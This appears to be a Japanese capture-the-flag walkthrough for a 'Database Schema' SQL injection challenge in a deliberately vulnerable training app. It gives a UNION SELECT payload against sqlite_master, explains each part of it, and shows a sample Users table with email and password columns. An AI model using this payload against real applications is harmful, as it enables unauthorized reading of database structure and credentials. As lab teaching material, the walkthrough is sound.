# Database Schema ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** SQLi
**目標:** データベースのテーブル構造を取得する

---

## 実行手順

検索バーに以下を入力:
```
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

## 解説

**なぜこのペイロードが動く？**

1. `'))` - 元のクエリの括弧を閉じる
2. `UNION SELECT` - 結果を結合
3. `sql,2,3,4,5,6,7,8,9` - 9個のカラム（元のクエリと同じ数）
4. `FROM sqlite_master` - SQLiteの内部テーブル
5. `--` - 残りをコメント化

**sqlite_master とは？**
SQLite の内部テーブルで、データベースの構造情報が格納されている:

| カラム | 内容 |
|--------|------|
| type | テーブル/インデックス/ビューなど |
| name | オブジェクト名 |
| sql | CREATE文 |

**取得できる情報の例:**
```sql
CREATE TABLE Users (
  id INTEGER PRIMARY KEY,
  email TEXT UNIQUE,
  password TEXT,
  role TEXT,
  ...
)
```

## 関連チャレンジ

- [User Credentials](../difficulty-4/user-credentials.md)
- [Login Admin](../difficulty-2/login-admin.md)
